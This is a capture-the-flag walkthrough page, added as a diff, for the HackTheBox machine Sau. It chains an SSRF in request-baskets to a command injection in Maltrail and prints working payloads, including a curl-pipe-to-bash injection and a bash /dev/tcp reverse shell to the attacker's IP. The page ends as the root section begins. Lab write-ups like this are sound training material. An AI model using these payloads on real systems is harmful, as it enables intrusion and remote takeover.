@@ -1,0 +1,299 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sau - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">WriteUPs</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/easy/sau/img/sau.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Sau - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Sau">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Sau</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Easy</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">07</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3><br/>About Sau</h3><br/>
+Sau is an easy difficulty machine on the HackTheBox platform. Firstly, we will exploit an SSRF vulnerability in <code>requests-baskets</code> to gain access to an internal HTTP service.<br/><br/>
+<h3><br>Shell as Puma</br></h3><br>
+The internal HTTP service hosts a vulnerable version of <code>Maltrail</code> that enables us to execute commands on the victim machine with the privileges of the <code>Puma</code> user.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+As the <code>puma</code> user, we exploit a sudoer privilege to gain access as the <code>root</code> user.<br/><br/>
+<h3><br>Recon</br></h3><br>
+As always, we will perform a port scan to identify open ports on the victim machine. To conduct this scan, we'll utilize the <code>nmap</code> tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="mf">10.10.11.224</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.224</span> <span class="p">(</span><span class="mf">10.10.11.224</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">58055</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">7478</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">55555</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+</pre></div>
+
+Once the scan is complete, we identify that ports 22 and 55555 are open on the victim machine. While I recognize that port 22 is associated with the SSH service, the service running on port 55555 is unknown to me.<br/><br/>
+To identify the service operating on port 55555, I will conduct a thorough scan using nmap. This will also provide additional information about the SSH service:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">55555</span> <span class="mf">10.10.11.224</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.224</span> <span class="p">(</span><span class="mf">10.10.11.224</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.27</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.7</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">3072</span> <span class="n">aa</span><span class="p">:</span><span class="mi">88</span><span class="p">:</span><span class="mi">67</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">3</span><span class="n">d</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">3</span><span class="n">a</span><span class="p">:</span><span class="mi">8</span><span class="n">a</span><span class="p">:</span><span class="n">ce</span><span class="p">:</span><span class="mi">9</span><span class="n">d</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="n">dd</span><span class="p">:</span><span class="n">f3</span><span class="p">:</span><span class="n">e1</span><span class="p">:</span><span class="n">ed</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="n">ec</span><span class="p">:</span><span class="mi">2</span><span class="n">e</span><span class="p">:</span><span class="n">b1</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">87</span><span class="p">:</span><span class="mi">2</span><span class="n">a</span><span class="p">:</span><span class="mi">0</span><span class="n">c</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="n">b1</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">87</span><span class="p">:</span><span class="mi">64</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">8</span><span class="n">a</span><span class="p">:</span><span class="mi">21</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">b3</span><span class="p">:</span><span class="mi">0</span><span class="n">c</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="n">fb</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="n">f2</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">cc</span><span class="p">:</span><span class="n">ce</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="mi">0</span><span class="n">e</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">36</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">55555</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="n">FourOhFourRequest</span><span class="p">:</span> 
+<span class="o">|</span>     <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">400</span> <span class="n">Bad</span> <span class="n">Request</span>
+<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
+<span class="o">|</span>     <span class="n">X</span><span class="o">-</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span> <span class="n">nosniff</span>
+<span class="o">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">04</span> <span class="n">Jan</span> <span class="mi">2024</span> <span class="mi">16</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">07</span> <span class="n">GMT</span>
+<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">75</span>
+<span class="o">|</span>     <span class="n">invalid</span> <span class="n">basket</span> <span class="n">name</span><span class="p">;</span> <span class="n">the</span> <span class="n">name</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">match</span> <span class="n">pattern</span><span class="p">:</span> <span class="o">^</span><span class="p">[</span><span class="n">wd</span><span class="o">-</span><span class="n">_</span>\<span class="o">.</span><span class="p">]{</span><span class="mi">1</span><span class="p">,</span><span class="mi">250</span><span class="p">}</span><span class="err">$</span>
+<span class="o">|</span>   <span class="n">GenericLines</span><span class="p">,</span> <span class="n">Help</span><span class="p">,</span> <span class="n">Kerberos</span><span class="p">,</span> <span class="n">LDAPSearchReq</span><span class="p">,</span> <span class="n">LPDString</span><span class="p">,</span> <span class="n">RTSPRequest</span><span class="p">,</span> <span class="n">SSLSessionReq</span><span class="p">,</span> <span class="n">TLSSessionReq</span><span class="p">,</span> <span class="n">TerminalServerCookie</span><span class="p">:</span> 
+<span class="o">|</span>     <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">400</span> <span class="n">Bad</span> <span class="n">Request</span>
+<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
+<span class="o">|</span>     <span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<span class="o">|</span>     <span class="n">Request</span>
+<span class="o">|</span>   <span class="n">GetRequest</span><span class="p">:</span> 
+<span class="o">|</span>     <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">302</span> <span class="n">Found</span>
+<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
+<span class="o">|</span>     <span class="n">Location</span><span class="p">:</span> <span class="o">/</span><span class="n">web</span>
+<span class="o">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">04</span> <span class="n">Jan</span> <span class="mi">2024</span> <span class="mi">16</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span> <span class="n">GMT</span>
+<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">27</span>
+<span class="o">|</span>     <span class="n">href</span><span class="o">=</span><span class="s2">"/web"</span><span class="o">&gt;</span><span class="n">Found</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;.</span>
+<span class="o">|</span>   <span class="n">HTTPOptions</span><span class="p">:</span> 
+<span class="o">|</span>     <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">200</span> <span class="n">OK</span>
+<span class="o">|</span>     <span class="n">Allow</span><span class="p">:</span> <span class="n">GET</span><span class="p">,</span> <span class="n">OPTIONS</span>
+<span class="o">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">04</span> <span class="n">Jan</span> <span class="mi">2024</span> <span class="mi">16</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">34</span> <span class="n">GMT</span>
+<span class="o">|</span><span class="n">_</span>    <span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">0</span>
+</pre></div>
+
+At first glance, port 55555 seems to be associated with an HTTP service.<br/><br/>
+<h3><br>Web Application - Port 55555</br></h3><br>
+Since we lack valid credentials to connect to the SSH service, our next step is to enumerate the web service hosted on port 55555. Before accessing the website through my browser, I run <code>whatweb</code> to identify the technologies employed by the website.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.224</span><span class="p">:</span><span class="mi">55555</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.224</span><span class="p">:</span><span class="mi">55555</span> <span class="p">[</span><span class="mi">302</span> <span class="n">Found</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.224</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="o">/</span><span class="n">web</span><span class="p">]</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.224</span><span class="p">:</span><span class="mi">55555</span><span class="o">/</span><span class="n">web</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Bootstrap</span><span class="p">[</span><span class="mf">3.3.7</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.224</span><span class="p">],</span> <span class="n">JQuery</span><span class="p">[</span><span class="mf">3.2.1</span><span class="p">],</span> <span class="n">PasswordField</span><span class="p">,</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Request</span> <span class="n">Baskets</span><span class="p">]</span>
+</pre></div>
+
+It didn't report any useful information.<br/><br/>
+When accessing the website through our browser, we will encounter the following content:<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/1.png"/><br/><br/>
+The website appears to be utilizing <a href="https://github.com/darklynx/request-baskets">request-baskets</a>, as indicated in the footer, specifically <code>requests-baskets</code> version <code>1.2.1</code>. Upon conducting further research on the internet, I discovered vulnerabilities associated with this particular version of <code>requests-baskets</code>.<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/2.png"/><br/><br/>
+There is an SSRF vulnerability in this version. SSRF (Server-Side Request Forgery) is a security vulnerability wherein an attacker can make the server perform requests to other web addresses on behalf of the server, potentially accessing sensitive information or executing unauthorized actions.<br/><br/>
+By exploiting this vulnerability, we could gain access to internal machine services that are not externally exposed. For instance, this machine might have an internal HTTP service hosted on port 80 that is not accessible externally.<br/><br/>
+While analyzing this <a href="https://github.com/entr0pie/CVE-2023-27163">POC</a>, I noticed that this vulnerability stems from insecure validation of an input field, allowing us to point to the IP of the local machine (127.0.0.1).<br/><br/>
+To exploit this, I will click on "Create":<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/3.png"/><br/><br/>
+Now, click on "Open Basket":<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/4.png"/><br/><br/>
+After clicking on <code>Configuration Settings</code>, we need to fill in the fields with the specific information:<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/5.png"/><br/><br/>
+In my case, I will input <code>http://127.0.0.1</code> into the <code>Forward URL</code> field and check the <code>Proxy Response</code> checkbox.<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/6.png"/><br/><br/>
+Finally, the basket is configured correctly to exploit this vulnerability.<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/7.png"/><br/><br/>
+Let's see what happens when we access <code>http://10.10.11.224:55555/92abysd</code>:<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/8.png"/><br/><br/>
+It seems that we have successfully exploited the vulnerability, gaining access to an internal service.<br/><br/>
+The internal HTTP service is running <code>Maltrail</code>, specifically version <code>0.53</code>. Let's once again search for information about possible vulnerabilities associated with this version of <code>Maltrail</code>.<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/9.png"/><br/><br/>
+There is an RCE (Remote Code Execution) vulnerability. This type of vulnerability could allow us to execute commands on the victim machine and subsequently gain access to the system.<br/><br/>
+This <a href="https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">page</a> explains the vulnerability and provides a POC to exploit it:<br/><br/>
+<em>"The <code>subprocess.check_output</code> function in mailtrail/core/http.py contains a command injection vulnerability in the <code>params.get("username")</code>parameter.</em><br/><br/>
+<em>An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication."</em><br/><br/>
+Since this vulnerability is in the <code>/login</code> section, we need to create a new basket pointing to the <code>http://127.0.0.1/login</code> URL.<br/><br/>
+<img alt="" src="http://localhost/writeups/htb/easy/sau/img/10.png"/><br/><br/>
+The new URL is <code>http://10.10.11.224:55555/pwq96wy</code>, so now we have to send the malicious payload. I will use <code>curl</code> to make the requests.<br/><br/>
+To confirm that I'm executing commands on the victim machine, I will use <code>tcpdump</code> to listen for ICMP traces.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
+<span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="k">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="n">tun0</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="nb">type</span> <span class="n">RAW</span> <span class="p">(</span><span class="n">Raw</span> <span class="n">IP</span><span class="p">),</span> <span class="n">snapshot</span> <span class="n">length</span> <span class="mi">262144</span> <span class="nb">bytes</span>
+</pre></div>
+
+Now, let's send the malicious request:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'username=;$(ping -c 1 10.10.16.6)'</span> <span class="s1">'http://10.10.11.224:55555/pwq96wy'</span>
+</pre></div>
+
+After sending this request, we will receive the ICMP trace:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
+<span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="k">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="n">tun0</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="nb">type</span> <span class="n">RAW</span> <span class="p">(</span><span class="n">Raw</span> <span class="n">IP</span><span class="p">),</span> <span class="n">snapshot</span> <span class="n">length</span> <span class="mi">262144</span> <span class="nb">bytes</span>
+<span class="mi">14</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mf">47.939527</span> <span class="n">IP</span> <span class="mf">10.10.11.224</span> <span class="o">&gt;</span> <span class="mf">10.10.16.6</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">request</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">3</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="mi">64</span>
+<span class="mi">14</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mf">47.939558</span> <span class="n">IP</span> <span class="mf">10.10.16.6</span> <span class="o">&gt;</span> <span class="mf">10.10.11.224</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">reply</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">3</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="mi">64</span>
+</pre></div>
+
+Now, to gain access to the system, I will use the common <code>bash</code> reverse shell, but I will save it into an <code>index.html</code> file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span>
+<span class="c1">#!/bin/bash</span>
+<span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.16.6</span><span class="o">/</span><span class="mi">3001</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+
+Before sending the new payload, I will set up my nc listener on port 3001:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+</pre></div>
+
+And I will start an HTTP server on port 80 to serve the <code>index.html</code> file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+
+Now, let's send the payload:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'username=;$(curl 10.10.16.6|bash)'</span> <span class="s1">'http://10.10.11.224:55555/pwq96wy'</span>
+</pre></div>
+
+Finally, we have gained access to the system:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.224</span><span class="p">:</span><span class="mf">60244.</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">897</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+<span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span>
+</pre></div>
+
+As always, let's adjust the TTY to interact more comfortably with the system:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span>  <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
+<span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span>  <span class="o">^</span><span class="n">Z</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+
+<span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+                               <span class="n">reset</span>
+<span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
+<span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span>
+</pre></div>
+
+We can read <code>user.txt</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span> <span class="n">cd</span>
+<span class="nd">puma@sau</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">df6cc36de5fd8c237086219a9b248ed0</span>
+<span class="nd">puma@sau</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+<h3><br>Shell as root</br></h3><br>
+As <code>puma</code>, we don't belong to any special group:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">puma</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">puma</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">puma</span><span class="p">)</span>
+<span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span>
+</pre></div>
+
